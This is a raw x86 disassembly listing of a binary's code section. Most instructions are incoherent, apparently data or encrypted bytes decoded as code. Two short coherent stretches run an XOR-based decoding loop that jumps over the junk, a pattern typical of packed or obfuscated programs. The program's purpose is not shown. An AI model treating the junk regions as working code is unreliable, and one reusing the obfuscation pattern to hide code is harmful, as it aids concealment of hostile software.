  4039a1:	vpcmpgtd xmm0,xmm6,xmm0
  4039a5:	push   edx
  4039a6:	into   
  4039a7:	inc    edi
  4039a8:	call   0x9fc7e830
  4039ad:	test   eax,0x6acfde1
  4039b2:	loop   0x403976
  4039b4:	mov    fs,WORD PTR [edi-0x743e159e]
  4039ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039bb:	push   edx
  4039bc:	inc    ecx
  4039bd:	sbb    eax,ebp
  4039bf:	enter  0xbdfd,0xd
  4039c3:	call   0x7665:0xaefa2c28
  4039ca:	fstp   QWORD PTR [ecx-0x9721887]
  4039d0:	and    al,0xf0
  4039d2:	xlat   BYTE PTR ds:[ebx]
  4039d3:	bound  edi,QWORD PTR [eax-0x39]
  4039d6:	test   al,0xde
  4039d8:	daa    
  4039d9:	sbb    BYTE PTR ds:0x741649b7,ch
  4039df:	enter  0x933d,0xe5
  4039e3:	mov    al,ds:0x8fdc22ab
  4039e8:	cs dec edx
  4039ea:	pop    eax
  4039eb:	cdq    
  4039ec:	mov    es,WORD PTR [ecx]
  4039ee:	xchg   esp,eax
  4039ef:	adc    BYTE PTR [eax+0x37],dl
  4039f2:	std    
  4039f3:	cmp    dh,BYTE PTR [edx]
  4039f5:	sbb    ch,dl
  4039f7:	dec    ebx
  4039f8:	add    al,0x4f
  4039fa:	and    BYTE PTR [ebp-0x1e],cl
  4039fd:	push   ecx
  4039fe:	xor    dh,BYTE PTR [edx]
  403a00:	jnp    0x4039e8
  403a02:	mov    al,ds:0x7b48cca7
  403a07:	push   DWORD PTR [ecx-0x6dd7ca9e]
  403a0d:	mul    DWORD PTR [edi-0x65ca2f53]
  403a13:	std    
  403a14:	(bad)  
  403a15:	mov    dl,0xd0
  403a17:	mov    eax,0x1b2ed1da
  403a1c:	out    dx,eax
  403a1d:	cmp    eax,0xdd3e6cd8
  403a22:	dec    esi
  403a23:	std    
  403a24:	xor    ah,BYTE PTR [eax-0x57]
  403a27:	(bad)  
  403a28:	fistp  QWORD PTR [ecx+0xfe6f844]
  403a2e:	inc    edi
  403a2f:	(bad)  
  403a30:	in     al,0x5c
  403a32:	cmp    al,0x23
  403a34:	pop    esp
  403a35:	outs   dx,BYTE PTR ds:[esi]
  403a36:	int3   
  403a37:	iret   
  403a38:	pushf  
  403a39:	push   0x2db5a965
  403a3e:	cmc    
  403a3f:	inc    esi
  403a40:	(bad)  
  403a41:	bnd ja 0x4039e8
  403a44:	jg     0x403a3d
  403a46:	dec    edi
  403a47:	fisub  WORD PTR [edx+0x49f80615]
  403a4d:	jo     0x403a42
  403a4f:	jo     0x403a70
  403a51:	les    ecx,FWORD PTR [edx]
  403a53:	inc    ebp
  403a54:	inc    esi
  403a55:	fadd   DWORD PTR [edi-0x74b423be]
  403a5b:	repnz adc BYTE PTR [edi],bl
  403a5e:	ins    DWORD PTR es:[edi],dx
  403a5f:	dec    ebp
  403a60:	push   es
  403a61:	enter  0x8e9f,0xf
  403a65:	popa   
  403a66:	adc    ecx,DWORD PTR [ebx+eiz*2-0x20]
  403a6a:	dec    edi
  403a6b:	imul   edi,DWORD PTR [ebx+0x4cd5aba4],0x9f771e1e
  403a75:	add    DWORD PTR [esi-0x35],esi
  403a78:	jno    0x403a5d
  403a7a:	js     0x403a74
  403a7c:	(bad)  
  403a7d:	mov    esp,0xfa5463e2
  403a82:	add    eax,0xf823d973
  403a87:	fxch   st(7)
  403a89:	(bad)
  403a8d:	inc    ebx
  403a8e:	out    dx,eax
  403a8f:	add    ch,ch
  403a91:	cmp    ah,dl
  403a93:	js     0x403a4c
  403a95:	shl    DWORD PTR [ebp-0x5e2af536],1
  403a9b:	push   ecx
  403a9c:	ret    
  403a9d:	in     eax,0xe0
  403a9f:	push   ss
  403aa0:	ss mov al,0xa3
  403aa3:	scas   al,BYTE PTR es:[edi]
  403aa4:	mov    bh,0xb5
  403aa6:	push   0xe8bd8dcc
  403aab:	mov    ds:0x700b4b84,eax
  403ab0:	lahf   
  403ab1:	stc    
  403ab2:	cs ret 0x2e24
  403ab6:	push   ss
  403ab7:	push   ebp
  403ab8:	aaa    
  403ab9:	xchg   esi,eax
  403aba:	jle    0x403a61
  403abc:	adc    al,0xb9
  403abe:	jmp    0xdbed:0xe140f9da
  403ac5:	pop    esp
  403ac6:	dec    edi
  403ac7:	cwde   
  403ac8:	hlt    
  403ac9:	dec    DWORD PTR [eax-0x139302f7]
  403acf:	test   al,0xc3
  403ad1:	std    
  403ad2:	jecxz  0x403a76
  403ad4:	sbb    DWORD PTR [esp+eax*4-0x1],ecx
  403ad8:	adc    BYTE PTR [ecx+0x56],0x35
  403adc:	xchg   ebx,eax
  403add:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ade:	out    dx,al
  403adf:	dec    esp
  403ae0:	mov    ds:0x450424f6,al
  403ae5:	es out 0x55,al
  403ae8:	mov    al,ds:0xd0fe7c92
  403aed:	xchg   edx,eax
  403aee:	repnz pop es
  403af0:	jb     0x403b02
  403af2:	mov    BYTE PTR [edi+0x2b],bl
  403af5:	add    eax,0xff895c46
  403afa:	ror    BYTE PTR fs:[ebx-0x378dc891],0x56
  403b02:	fisub  DWORD PTR [edx+0x2b]
  403b05:	imul   ebx,DWORD PTR [eax+edi*4+0x4d],0x50198e2f
  403b0d:	pop    ebp
  403b0e:	sub    eax,0xcf7fd740
  403b13:	xchg   edx,eax
  403b14:	(bad)  
  403b16:	xchg   edx,eax
  403b17:	xchg   ebx,eax
  403b18:	jmp    0xfb1bcde3
  403b1d:	call   0x202ae558
  403b22:	cld    
  403b23:	jmp    0x1ad62a39
  403b28:	jmp    0x88476768
  403b2d:	mov    bl,0xc
  403b2f:	dec    ebp
  403b30:	inc    esp
  403b31:	pop    ebx
  403b32:	xchg   DWORD PTR [ebp+0x15],ebx
  403b35:	jb     0x403ba2
  403b37:	mov    DWORD PTR [edx],edi
  403b39:	and    BYTE PTR [edx-0x2a0c174f],ch
  403b3f:	xchg   ecx,eax
  403b40:	je     0x403bae
  403b42:	lds    ebx,FWORD PTR [ecx+0x2bd9f7e3]
  403b48:	mov    ch,BYTE PTR [eax]
  403b4a:	add    edx,edx
  403b4c:	sbb    BYTE PTR [ecx+ecx*1],ah
  403b4f:	sub    BYTE PTR [ebp-0x59],bl
  403b52:	mov    dh,BYTE PTR [ebp-0x64]
  403b55:	ror    bl,1
  403b57:	inc    eax
  403b58:	mov    ds:0x641eadcd,eax
  403b5d:	or     al,0xd0
  403b5f:	loope  0x403b90
  403b61:	xchg   edx,eax
  403b62:	jo     0x403b5d
  403b64:	jecxz  0x403af1
  403b66:	inc    esp
  403b67:	idiv   BYTE PTR [edi+0x31]
  403b6a:	adc    al,0x6f
  403b6c:	(bad)  
  403b6e:	mul    BYTE PTR [ecx+0x31ce05ef]
  403b74:	dec    ecx
  403b75:	shr    DWORD PTR [edx],cl
  403b77:	dec    esp
  403b78:	fistp  WORD PTR [edi]
  403b7a:	iret   
  403b7b:	pextrw ebp,(bad),0xc5
  403b7d:	lods   eax,DWORD PTR ds:[esi]
  403b7e:	in     eax,dx
  403b7f:	(bad)  
  403b81:	outs   dx,DWORD PTR ds:[esi]
  403b82:	push   es
  403b83:	xlat   BYTE PTR ds:[ebx]
  403b84:	cmp    DWORD PTR ss:[ebx+0x18f53559],eax
  403b8b:	ins    BYTE PTR es:[edi],dx
  403b8c:	lahf   
  403b8d:	(bad)  
  403b8e:	sbb    eax,0x54a3db6c
  403b93:	mov    esi,0x3785fa0b
  403b98:	mov    eax,0x7a014dd4
  403b9d:	jmp    0x1980:0x94aee18
  403ba4:	and    ah,bh
  403ba6:	(bad)  
  403ba7:	fist   DWORD PTR [ebp-0x76cddac2]
  403bad:	or     BYTE PTR [eax],0xd0
  403bb0:	cld    
  403bb1:	push   esi
  403bb2:	cld    
  403bb3:	lds    edx,FWORD PTR [esi+0x1b91095d]
  403bb9:	xor    eax,0x2cbab6ad
  403bbe:	fbstp  TBYTE PTR [edi]
  403bc0:	cs mov edi,0x2e08e657
  403bc6:	call   0xee29:0xac4e36cb
  403bcd:	(bad)  
  403bce:	(bad)  
  403bcf:	ss ret 0x30c7
  403bd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bd4:	cld    
  403bd5:	sbb    DWORD PTR [esp+edx*2],0xf59ee092
  403bdc:	push   edi
  403bdd:	sbb    eax,0x14de639a
  403be2:	lea    ebp,[ebp+0xc9c3626]
  403be8:	popf   
  403be9:	xchg   DWORD PTR [ebx],esp
  403beb:	ror    BYTE PTR [ecx],1
  403bed:	and    eax,0xe809956b
  403bf2:	lods   al,BYTE PTR ds:[esi]
  403bf3:	jle    0x403bf5
  403bf5:	dec    ecx
  403bf6:	repnz sub eax,0xeb1798d0
  403bfc:	or     DWORD PTR [eiz*4-0x28cca90f],ecx
  403c03:	cmp    eax,0x5d635ed4
  403c08:	fdiv   st(5),st
  403c0a:	cmp    BYTE PTR [edi],bh
  403c0c:	cmp    eax,0x50921bf5
  403c11:	punpcklwd mm4,mm6
  403c14:	out    dx,al
  403c15:	shl    DWORD PTR [esi+0x26],1
  403c18:	aas    
  403c19:	leave  
  403c1a:	hlt    
  403c1b:	adc    eax,0x5f89a84f
  403c20:	xchg   ebp,eax
  403c21:	sbb    DWORD PTR [esi+0x45cc9e5d],esp
  403c27:	adc    BYTE PTR [ecx+edi*1-0x2558a14b],bh
  403c2e:	(bad)  
  403c2f:	cld    
  403c30:	cdq    
  403c31:	inc    eax
  403c32:	mov    ds,esp
  403c34:	test   BYTE PTR [esi],dh
  403c36:	inc    edi
  403c37:	adc    ebx,ebp
  403c39:	ins    DWORD PTR es:[edi],dx
  403c3a:	mov    bh,BYTE PTR [ebx]
  403c3c:	int    0xef
  403c3e:	push   eax
  403c3f:	bound  esi,QWORD PTR [ecx-0x44]
  403c42:	adc    eax,0xad62b0e8
  403c47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c48:	cs into 
  403c4a:	lea    ebp,[ebp+0x6b181b5b]
  403c50:	test   ebp,0xa7ef2b94
  403c56:	inc    ah
  403c58:	cdq    
  403c59:	push   ebp
  403c5a:	or     eax,0x94df27c0
  403c5f:	fnsave [ebx+eax*2]
  403c62:	ret    
  403c63:	les    eax,FWORD PTR [ebp-0x74]
  403c66:	jmp    0x403c2b
  403c68:	jp     0x403cc2
  403c6a:	push   ds
  403c6b:	sub    DWORD PTR [esi-0x7cfce0eb],esi
  403c71:	push   0xffffffca
  403c73:	mov    DWORD PTR [ecx-0x3513c3bd],esi
  403c79:	mov    WORD PTR gs:[ebx*8-0x43ff1754],cs
  403c81:	push   es
  403c82:	mov    esp,0x57fcb887
  403c87:	out    0x22,eax
  403c89:	push   edi
  403c8a:	mov    DWORD PTR [ebp-0x6f],ebp
  403c8d:	out    dx,al
  403c8e:	imul   ebx,edx,0x29
  403c91:	cld    
  403c92:	push   cs
  403c93:	adc    ecx,DWORD PTR [esi]
  403c95:	scas   al,BYTE PTR es:[edi]
  403c96:	daa    
  403c97:	jae    0x403c2e
  403c99:	cmp    BYTE PTR [esi],dh
  403c9b:	pushf  
  403c9c:	xlat   BYTE PTR ds:[ebx]
  403c9d:	(bad)  
  403c9f:	dec    esi
  403ca0:	ins    DWORD PTR es:[edi],dx
  403ca1:	add    ax,di
  403ca4:	movzx  eax,ax
  403ca7:	mov    DWORD PTR [ebp-0x14],eax
  403caa:	mov    eax,DWORD PTR [ebp+0x8]
  403cad:	movzx  eax,WORD PTR [eax+edx*4]
  403cb1:	xor    eax,0x8a38
  403cb6:	add    eax,edi
  403cb8:	mov    edi,DWORD PTR [ebp-0x14]
  403cbb:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403cbf:	mov    eax,DWORD PTR [ebp-0xc]
  403cc2:	inc    edx
  403cc3:	cmp    edx,eax
  403cc5:	jne    0x40389a
  403ccb:	pop    edi
  403ccc:	pop    ebx
  403ccd:	mov    eax,DWORD PTR [ebp-0x8]
  403cd0:	mov    edx,DWORD PTR [ebp+0x10]
  403cd3:	xor    eax,ecx
  403cd5:	add    eax,esi
  403cd7:	mov    DWORD PTR [edx],eax
  403cd9:	jmp    0x4040ce
  403cde:	mov    ch,0xd5
  403ce0:	or     dh,al
  403ce2:	push   0xfffffff1
  403ce4:	jge    0x403d43
  403ce6:	inc    eax
  403ce7:	xchg   ecx,eax
  403ce8:	add    esp,0xf677b2c8
  403cee:	mov    ebx,0x567e7e1f
  403cf3:	jns    0x403d73
  403cf5:	jle    0x403d26
  403cf7:	dec    esi
  403cf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cf9:	dec    ecx
  403cfa:	imul   ecx,DWORD PTR [ecx+0x4f],0x32
  403cfe:	sbb    BYTE PTR [ecx+0x30da6a5f],al
  403d04:	xor    DWORD PTR [edx+0x5275465f],0x61
  403d0b:	push   0x17a56bbc
  403d10:	or     cl,BYTE PTR [ebp+0x60cfa9c8]
  403d16:	jns    0x403cf0
  403d18:	(bad)  [eax]
  403d1a:	retf   
  403d1b:	das    
  403d1c:	into   
  403d1d:	cmc    
  403d1e:	(bad)  
  403d1f:	mov    esp,0x9eeeaf9e
  403d24:	stos   DWORD PTR es:[edi],eax
  403d25:	pop    ebp
  403d26:	push   edx
  403d27:	(bad)  [ecx+ebx*2+0x60]
  403d2b:	mov    esp,0x404f9ff9
  403d30:	mov    eax,0x78ee5a47
  403d35:	out    dx,al
  403d36:	es push ds
  403d38:	inc    ecx
  403d39:	pusha  
  403d3a:	mov    dl,BYTE PTR [edx]
  403d3c:	rcl    DWORD PTR [esi+0x26],cl
  403d3f:	fild   DWORD PTR [eax-0x2521286d]
  403d45:	shl    DWORD PTR [ecx],cl
  403d47:	fld    QWORD PTR [ecx+0x2]
  403d4a:	hlt    
  403d4b:	fbld   TBYTE PTR [eax+eiz*2]
  403d4e:	lock mov al,0x67
  403d51:	mov    esi,0x2fb4e162
  403d56:	js     0x403d53
  403d58:	sub    eax,0x61f45778
  403d5d:	mov    ebx,0x11e38259
  403d62:	jno    0x403db1
  403d64:	mov    eax,0xf3b139b5
  403d69:	call   0xcfb7:0x34f11da1
  403d70:	dec    ecx
  403d71:	inc    edi
  403d72:	adc    edx,DWORD PTR [ecx-0x7a]
  403d75:	mov    edi,DWORD PTR [eax]
  403d77:	arpl   WORD PTR ds:0x1f906450,sp
  403d7d:	mov    BYTE PTR [ecx-0x3043e4b1],0xd2
  403d84:	call   0xc989e141
  403d89:	(bad)
  403d8d:	and    dl,ch
  403d8f:	or     DWORD PTR [ebp-0x531ea5bd],esi
  403d95:	dec    eax
  403d96:	cmp    DWORD PTR [ebp-0x3b09fdc0],ebp
  403d9c:	imul   esi,DWORD PTR [ecx+0xa],0x0
  403da0:	mov    esp,0xfb270318
  403da5:	mov    ecx,0xb3fc6eb6
  403daa:	mov    ebx,0x2f380666
  403daf:	and    al,0x51
  403db1:	in     al,0x7f
  403db3:	sub    ecx,DWORD PTR [edx+0x7b]
  403db6:	stos   BYTE PTR es:[edi],al
  403db7:	add    cl,BYTE PTR [eax+0x4631428a]
  403dbd:	(bad)  
  403dbe:	mov    cl,0xcd
  403dc0:	ja     0x403dfb
  403dc2:	push   esp
  403dc3:	fmul   QWORD PTR [ecx]
  403dc5:	mov    esp,DWORD PTR ds:0x6d42d69b
  403dcb:	fdivp  st(6),st
  403dcd:	jns    0x403dba
  403dcf:	call   0x3317:0xe3d4828f
  403dd6:	(bad)  
  403dd8:	xchg   edi,eax
  403dd9:	out    dx,al
  403dda:	ret    
  403ddb:	lods   eax,DWORD PTR ds:[esi]
  403ddc:	jne    0x403de8
  403dde:	stos   DWORD PTR es:[edi],eax
  403ddf:	pop    esi
  403de0:	or     DWORD PTR [ecx+0x1d],0x20
  403de4:	inc    eax
  403de5:	sbb    eax,0xc735abb3
  403dea:	std    
  403deb:	jmp    0x89d1a607
  403df0:	retf   0x54b9
  403df3:	icebp  
  403df4:	shl    BYTE PTR [eax*2-0xa1ac88e],0x39
  403dfc:	dec    edx
  403dfd:	aaa    
  403dfe:	dec    BYTE PTR [edx+0x4f]
  403e01:	adc    eax,ecx
  403e03:	mov    bl,0x5d
  403e05:	xor    DWORD PTR [ecx-0x4870d9d2],esi
  403e0b:	in     eax,dx
  403e0c:	retf   
  403e0d:	inc    edx
  403e0e:	mov    BYTE PTR [ebx],bl
  403e10:	retf   
  403e11:	dec    ecx
  403e12:	test   eax,0x43f62ffd
  403e17:	jbe    0x403e33
  403e19:	popf   
  403e1a:	sahf   
  403e1b:	dec    eax
  403e1c:	into   
  403e1d:	xor    DWORD PTR [ebp+0x1d4bde00],ecx
  403e23:	jnp    0x403e49
  403e25:	data16 in al,dx
  403e27:	aas    
  403e28:	jae    0x403df5
  403e2a:	mov    eax,0x7584d57e
  403e2f:	sar    al,1
  403e31:	(bad)  
  403e32:	jns    0x403dd1
  403e34:	inc    ebx
  403e35:	mov    al,0x20
  403e37:	lods   eax,DWORD PTR ds:[esi]
  403e38:	and    edx,eax
  403e3a:	mov    bl,0x4d
  403e3c:	add    al,0x52
  403e3e:	add    dh,BYTE PTR [edx+edx*4+0x1a7c9f7b]
  403e45:	scas   al,BYTE PTR es:[edi]
  403e46:	lock aam 0x3
  403e49:	ficom  DWORD PTR [ecx+edx*8-0x4f]
  403e4d:	jl     0x403e13
  403e4f:	jns    0x403e14
  403e51:	dec    eax
  403e52:	ret    0xdad3
  403e55:	pop    edi
  403e56:	jns    0x403de1
  403e58:	inc    eax
  403e59:	push   esp
  403e5a:	sub    BYTE PTR [ebx+0x9],ah
  403e5d:	sub    ch,BYTE PTR [ebp-0x77d525aa]
  403e63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e64:	outs   dx,BYTE PTR ds:[esi]
  403e65:	xchg   esp,eax
  403e66:	stos   DWORD PTR es:[edi],eax
  403e67:	push   ds
  403e68:	xor    eax,edi
  403e6a:	mov    cs,WORD PTR [edx+0x61]
  403e6d:	or     al,0xd8
  403e6f:	sub    ebx,0x2c0e4f8e
  403e75:	dec    esi
  403e76:	pop    eax
  403e77:	mov    dl,0xa7
  403e79:	fucomp st(0)
  403e7b:	ja     0x403eec
  403e7d:	and    dl,ch
  403e7f:	ror    al,cl
  403e81:	fcom   DWORD PTR [eax+0x54]
  403e84:	stc    
  403e85:	sub    BYTE PTR [esi-0x7a82763a],0xa3
  403e8c:	cmp    cl,BYTE PTR [ebx]
  403e8e:	xchg   edi,eax
  403e8f:	xlat   BYTE PTR ds:[ebx]
  403e90:	xchg   DWORD PTR [ebx-0x4c],edx
  403e93:	jne    0x403f01
  403e95:	xor    eax,0xf7e019a4
  403e9a:	add    BYTE PTR [edx+0x301f6371],dl
  403ea0:	adc    al,0xcb
  403ea2:	std    
  403ea3:	arpl   WORD PTR [eax],si
  403ea5:	jle    0x403e89
  403ea7:	out    dx,al
  403ea8:	sub    cl,BYTE PTR [edx+edi*1-0x692dc33a]
  403eaf:	inc    ebp
  403eb0:	vpsllw xmm2,xmm3,XMMWORD PTR [edx+0x5e6ea4b0]
  403eb8:	mov    dl,0xcc
  403eba:	push   ss
  403ebb:	cmp    BYTE PTR [eax-0x75195261],dh
  403ec1:	push   edx
  403ec2:	pop    esi
  403ec3:	cld    
  403ec4:	rcr    ebx,cl
  403ec6:	test   BYTE PTR [edi+0x5759a694],al
  403ecc:	push   edi
  403ecd:	fbld   TBYTE PTR [ebx+ecx*1]
  403ed0:	adc    edi,DWORD PTR [ebx+0x2b851a80]
  403ed6:	cmp    eax,esp
  403ed8:	aas    
  403ed9:	outs   dx,BYTE PTR ds:[esi]
  403eda:	and    BYTE PTR [eax],dl
  403edc:	mov    bl,0x96
  403ede:	lods   al,BYTE PTR ds:[esi]
  403edf:	and    BYTE PTR [edi],bl
  403ee1:	jp     0x403f22
  403ee3:	cdq    
  403ee4:	arpl   dx,si
  403ee6:	shl    BYTE PTR [eax-0x3b],0x58
  403eea:	cmc    
  403eeb:	cmp    al,BYTE PTR [edi-0x19]
  403eee:	scas   al,BYTE PTR es:[edi]
  403eef:	mov    al,0x8b
  403ef1:	rcl    DWORD PTR [edx+0x572c2d5],0xbf
  403ef8:	retf   
  403ef9:	jbe    0x403f5a
  403efb:	mov    dl,BYTE PTR [eax]
  403efd:	pop    ebx
  403efe:	ds das 
  403f00:	nop
  403f01:	rcr    BYTE PTR [eax],cl
  403f03:	shl    DWORD PTR [ebp+0x67],cl
  403f06:	jo     0x403ea5
  403f08:	(bad)  
  403f09:	mov    DWORD PTR [eax-0x435d06e1],eax
  403f0f:	pop    eax
  403f10:	adc    al,0xf7
  403f12:	in     al,dx
  403f13:	inc    esp
  403f14:	inc    esi
  403f15:	or     DWORD PTR [edi+0x5a],ecx
  403f18:	xchg   esp,eax
  403f19:	cdq    
  403f1a:	inc    esp
  403f1b:	jmp    0x3eca793b
  403f20:	sub    ebx,0xffffffa2
  403f23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f24:	ss and ebx,esi
  403f27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f28:	mov    esi,0x262766e0
  403f2d:	adc    BYTE PTR [edi-0x1d2d01a9],bh
  403f33:	mov    ch,0x3b
  403f35:	add    DWORD PTR [edi+0x834a8d6],ebp
  403f3b:	jns    0x403f6d
  403f3d:	xchg   ebx,eax
  403f3e:	and    al,0xa0
  403f40:	push   ebx
  403f41:	push   0xffffffea
  403f43:	(bad)  
  403f44:	push   0xffffffd3
  403f46:	lea    ebp,[esi-0x7a]
  403f49:	iret   
  403f4a:	test   eax,0x63c7520e
  403f4f:	xor    eax,0x2f0b4795
  403f54:	inc    ecx
  403f55:	mov    al,0xd8
  403f57:	jmp    0xeaa588df
  403f5c:	fld    DWORD PTR [edx-0x3e966522]
  403f62:	out    0x68,al
  403f64:	jnp    0x403f8b
  403f66:	pop    eax
  403f67:	dec    ebp
  403f68:	std    
  403f69:	retf   
  403f6a:	mov    esp,0x3994b450
  403f6f:	aam    0x1c
  403f71:	scas   al,BYTE PTR es:[edi]
  403f72:	mov    eax,0x47a0e0ad
  403f77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f78:	(bad)  
  403f79:	clc    
  403f7a:	pushf  
  403f7b:	adc    edx,DWORD PTR [edx]
  403f7d:	aam    0x79
  403f7f:	push   ds
  403f80:	rep stos BYTE PTR es:[edi],al
  403f82:	xchg   ecx,eax
  403f83:	xchg   ebp,eax
  403f84:	pop    edi
  403f85:	xor    BYTE PTR [ebx+ebx*8-0x7abce32e],cl
  403f8c:	inc    edx
  403f8d:	clc    
  403f8e:	in     al,0x94
  403f90:	test   eax,0xe6fed619
  403f95:	fxch   st(6)
  403f97:	sub    esi,ebp
  403f99:	xchg   ebp,eax
  403f9a:	xor    DWORD PTR [esi+edx*1+0x2],ebp
  403f9e:	addr16 into 
  403fa0:	sub    al,0x4b
  403fa2:	pop    es
  403fa3:	retf   0x31c3
  403fa6:	test   al,0xa4
  403fa8:	std    
  403fa9:	sub    ebx,DWORD PTR [ecx-0x33]
  403fac:	sti    
  403fad:	inc    ebx
  403fae:	mov    WORD PTR ds:0x6878317b,ss
  403fb4:	mov    ds:0xb5d98e0a,eax
  403fb9:	aaa    
  403fba:	jo     0x403ff5
  403fbc:	arpl   WORD PTR ds:0x24435eb0,si
  403fc2:	mov    eax,0x94e28faa
  403fc7:	push   ss
  403fc8:	pop    ds
  403fc9:	stos   DWORD PTR es:[edi],eax
  403fca:	popa   
  403fcb:	das    
  403fcc:	push   ebp
  403fcd:	(bad)  
  403fce:	in     eax,0xa2
  403fd0:	fsubr  DWORD PTR ds:0x40451b67
  403fd6:	call   0xa5f3a959
  403fdb:	jbe    0x403f85
  403fdd:	mov    al,BYTE PTR [ebp-0x7d]
  403fe0:	mov    cl,0xf8
  403fe2:	mov    al,0x74
  403fe4:	dec    esp
  403fe5:	sub    al,al
  403fe7:	jno    0x404064
  403fe9:	dec    ebx
  403fea:	mov    dh,0x77
  403fec:	ror    BYTE PTR [ebp+ecx*1+0x7fd0fe73],cl
  403ff3:	mul    BYTE PTR [esi]
  403ff5:	pop    esp
  403ff6:	jle    0x404013
  403ff8:	inc    edi
  403ff9:	push   0x83ddd1ca
  403ffe:	cmp    DWORD PTR [esi],0x3ec54bc
  404004:	jmp    0xb75e:0x2cb48e3d
  40400b:	inc    esp
  40400c:	sub    DWORD PTR [ebp+0x4b],ebp
  40400f:	stc    
  404010:	mov    DWORD PTR [eax-0x48],eax
  404013:	push   esi
  404014:	and    dl,BYTE PTR [edi+ecx*8-0x4a2d12e9]
  40401b:	scas   al,BYTE PTR es:[edi]
  40401c:	lods   eax,DWORD PTR ds:[esi]
  40401d:	or     eax,0x79c27a69
  404022:	add    dh,dh
  404024:	lahf   
  404025:	int3   
  404026:	ins    DWORD PTR es:[edi],dx
  404027:	into   
  404028:	daa    
  404029:	je     0x40400a
  40402b:	and    BYTE PTR [edx-0x3269ca20],cl
  404031:	rcr    DWORD PTR [bx+si+0x79],1
  404035:	jg     0x40409b
  404037:	retf   
  404038:	rcl    BYTE PTR [eax-0x18],cl
  40403b:	js     0x403fc1
  40403d:	push   cs
  40403e:	fild   WORD PTR [ecx]
  404040:	sbb    esi,eax
  404042:	dec    eax
  404043:	es sbb eax,0xfd3c137c
  404049:	addr16 push ss
  40404b:	xchg   edi,eax
  40404c:	cmc    
  40404d:	or     BYTE PTR [ebx],0xa0
  404050:	add    DWORD PTR [edx],ecx
  404052:	or     ecx,edx
  404054:	enter  0xee25,0x7d
  404058:	cmp    esp,DWORD PTR [ebp+0x3472be9c]
  40405e:	cdq    
  40405f:	inc    esi
  404060:	aam    0xbf
  404062:	inc    edi
  404063:	imul   ecx,ebx,0x47
  404066:	(bad)  
  404067:	cs std 
  404069:	xor    edx,DWORD PTR [ecx-0x6e9b7fee]
  40406f:	mov    ecx,0x896fe741
  404074:	xchg   ecx,eax
  404075:	lea    ecx,[edi+0x2712c389]
  40407b:	dec    ebp
  40407c:	nop
  40407d:	push   0x12b9b7d2
  404082:	rol    DWORD PTR [edx+0x32],0x80
  404086:	iret   
  404087:	addr16 leave 
  404089:	and    eax,0x23b3970d
  40408e:	cmp    dh,0x7d
  404091:	add    DWORD PTR [esi+0x1f],esp
  404094:	scas   eax,DWORD PTR es:[edi]
  404095:	test   BYTE PTR [eax-0x41],dh
  404098:	fmulp  st(6),st
  40409a:	and    eax,0xe86f50ac
  40409f:	int    0x23
  4040a1:	lods   al,BYTE PTR ds:[esi]
  4040a2:	pop    eax
  4040a3:	mov    eax,ds:0x40cbf09
  4040a8:	daa    
  4040a9:	fst    st(3)
  4040ab:	sbb    ebp,DWORD PTR [ecx-0x5852b24b]
  4040b1:	xor    DWORD PTR ds:[ebp-0x45d91f51],esi
  4040b8:	sahf   
  4040b9:	bound  ebp,QWORD PTR [eax+0x71c64935]
  4040bf:	jno    0x4040e1
  4040c1:	push   ss
  4040c2:	iret   
  4040c3:	cmp    DWORD PTR [edi+0x56],ebp
  4040c6:	or     BYTE PTR [eax+0x36],bl
  4040c9:	lea    esp,[esi]
  4040cb:	pop    esi
  4040cc:	std    
  4040cd:	stos   DWORD PTR es:[edi],eax
  4040ce:	mov    eax,DWORD PTR [ebp-0x8]
  4040d1:	xor    eax,ecx
  4040d3:	add    eax,esi
  4040d5:	mov    DWORD PTR [ebp+0x8],eax
  4040d8:	mov    eax,DWORD PTR [ebp+0x8]
  4040db:	jmp    0x4044d0
  4040e0:	pop    edx
  4040e1:	ret    0x1375
  4040e4:	jge    0x4040a3
  4040e6:	ins    BYTE PTR es:[edi],dx
  4040e7:	jae    0x404096
  4040e9:	test   BYTE PTR [eax+0x7536dccd],ah
  4040ef:	inc    esp
  4040f0:	xchg   ebx,eax
  4040f1:	sbb    edi,DWORD PTR [esi+0x7e]
  4040f4:	push   esi
  4040f5:	jns    0x404175
  4040f7:	jle    0x404138
  4040f9:	jae    0x40412f
  4040fb:	sbb    eax,0x63c55ac8
  404100:	pop    ss
  404101:	jbe    0x404103
  404103:	dec    esi
  404104:	(bad)  
  404105:	jo     0x40408e
  404107:	and    esp,DWORD PTR [ecx+0x7e0282e9]
  40410d:	add    al,0xbe
  40410f:	sbb    esi,DWORD PTR [eax+0x7c]
  404112:	scas   eax,DWORD PTR es:[edi]
  404113:	jne    0x40418d
  404115:	adc    eax,0xc1e8894a
  40411a:	xor    al,0xa
  40411c:	pop    esi
  40411d:	scas   al,BYTE PTR es:[edi]
  40411e:	inc    ebp
  40411f:	inc    edi
  404120:	(bad)  
  404121:	scas   eax,DWORD PTR es:[edi]
  404122:	pop    ds
  404123:	out    0xad,eax
  404125:	inc    ebp
  404126:	mov    edi,0xf9a4c9c3
  40412b:	jns    0x4040e6
  40412d:	shl    BYTE PTR [edi+0x46],1
  404130:	push   DWORD PTR [edi+0x6b]
  404133:	cld    
  404134:	add    BYTE PTR [ecx+0x15],ch
  404137:	into   
  404138:	push   ds
  404139:	sahf   
  40413a:	sub    ah,bl
  40413c:	aam    0x0
  40413e:	rsqrtps xmm7,XMMWORD PTR [esi]
  404141:	pushf  
  404142:	xor    bh,BYTE PTR [ebp+0x26a2c83c]
  404148:	or     DWORD PTR [ebx-0x6f331f97],eax
  40414e:	retf   0xd137
  404151:	call   0xcb1d0602
  404156:	repz dec eax
  404158:	ret    0x2c97
  40415b:	fs cmc 
  40415d:	pop    edi
  40415e:	add    DWORD PTR [esi],ebx
  404160:	push   eax
  404161:	fdiv   DWORD PTR [esp+edi*2+0x3f4128a8]
  404168:	scas   eax,DWORD PTR es:[edi]
  404169:	xchg   ecx,eax
  40416a:	xor    ebx,DWORD PTR [ebx-0x60]
  40416d:	and    eax,0xbcc4ec7b
  404172:	pop    esp
